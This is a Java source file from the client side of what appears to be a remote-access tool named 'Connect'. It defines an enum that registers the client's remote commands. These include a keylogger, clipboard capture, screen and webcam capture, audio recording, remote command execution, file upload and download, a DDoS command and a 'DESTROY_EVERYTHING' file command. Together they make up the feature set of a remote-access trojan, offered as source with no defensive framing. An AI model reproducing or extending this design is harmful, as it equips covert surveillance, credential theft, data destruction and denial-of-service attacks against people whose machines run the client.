package br.com.introcdc.connect.client.command;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:45
 */

import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.commands.audio.ClientCommandAudio;
import br.com.introcdc.connect.client.commands.control.*;
import br.com.introcdc.connect.client.commands.file.external.ClientCommandDestroyEverything;
import br.com.introcdc.connect.client.commands.file.external.ClientCommandDownload;
import br.com.introcdc.connect.client.commands.file.external.ClientCommandReceive;
import br.com.introcdc.connect.client.commands.file.external.ClientCommandSend;
import br.com.introcdc.connect.client.commands.file.manipulate.*;
import br.com.introcdc.connect.client.commands.file.navigation.*;
import br.com.introcdc.connect.client.commands.image.ClientCommandHistory;
import br.com.introcdc.connect.client.commands.image.ClientCommandLiveStopper;
import br.com.introcdc.connect.client.commands.image.ClientCommandScreenWebcam;
import br.com.introcdc.connect.client.commands.info.*;
import br.com.introcdc.connect.client.commands.message.*;
import br.com.introcdc.connect.client.commands.process.*;

import java.util.HashMap;
import java.util.Map;

public enum ClientCommandEnum {
    // Audio
    AUDIO(ClientCommandAudio.class),

    // Control
    DDOS(ClientCommandDDOS.class),
    FUNCTIONS(ClientCommandFunctions.class),
    KEYBOARD_TYPE(ClientCommandKeyboardType.class),
    MOUSE_CLICK(ClientCommandMouseClick.class),
    MOUSE_SCROLL(ClientCommandMouseScroll.class),
    WALLPAPER(ClientCommandWallpaper.class),

    // File
    DESTROY_EVERYTHING(ClientCommandDestroyEverything.class),
    DOWNLOAD(ClientCommandDownload.class),
    RECEIVE(ClientCommandReceive.class),
    SEND(ClientCommandSend.class),
    COPY(ClientCommandCopy.class),
    DEL(ClientCommandDel.class),
    MAKEDIR(ClientCommandMakeDir.class),
    MOVE(ClientCommandMove.class),
    UNZIP(ClientCommandUnzip.class),
    ZIP(ClientCommandZip.class),
    ENTER_FOLDER(ClientCommandEnterFolder.class),
    FILE_INFO(ClientCommandFileInfo.class),
    LIST_FILES(ClientCommandListFiles.class),
    OPEN(ClientCommandOpen.class),
    VIEW(ClientCommandView.class),

    // Image
    HISTORY(ClientCommandHistory.class),
    LIVE_STOPPER(ClientCommandLiveStopper.class),
    SCREEN_WEBCAM(ClientCommandScreenWebcam.class),

    // Info
    CLOSE(ClientCommandClose.class),
    DEBUG(ClientCommandDebug.class),
    GC(ClientCommandGC.class),
    IGNORE(ClientCommandIgnore.class),
    INFO(ClientCommandInfo.class),
    PING(ClientCommandPing.class),
    RESTART(ClientCommandRestart.class),
    UNINSTALL(ClientCommandUninstall.class),
    UPDATE(ClientCommandUpdate.class),

    // Message
    ASK(ClientCommandAsk.class),
    CHAT(ClientCommandChat.class),
    CLIPBOARD(ClientCommandClipboard.class),
    KEYLOGGER(ClientCommandKeyLogger.class),
    MESSAGE(ClientCommandMessage.class),
    VOICE(ClientCommandVoice.class),

    // Process
    EXEC(ClientCommandExec.class),
    KILL(ClientCommandKill.class),
    LIST_PROCESS(ClientCommandListProcess.class),
    LOG(ClientCommandLog.class),
    PROCESS(ClientCommandProcess.class);

    private static Map<String, ClientCommand> COMMAND_MAP = new HashMap<>();

    public static Map<String, ClientCommand> getCommandMap() {
        return COMMAND_MAP;
    }

    private final Class<? extends ClientCommand> commandClass;

    ClientCommandEnum(Class<? extends ClientCommand> commandClass) {
        this.commandClass = commandClass;
    }

    public Class<? extends ClientCommand> getCommandClass() {
        return commandClass;
    }

    public static void registerCommands() {
        for (ClientCommandEnum clientCommandEnum : values()) {
            try {
                ClientCommand clientCommand = clientCommandEnum.getCommandClass().newInstance();
                for (String commandString : clientCommand.getCommands()) {
                    getCommandMap().put(commandString, clientCommand);
                }
            } catch (Exception exception) {
                ConnectClient.msg("Ocorreu um erro ao registrar o comando: " + clientCommandEnum.toString() + " (" + exception.getMessage() + ")");
                ConnectClient.exception(exception);
            }
        }
    }

}
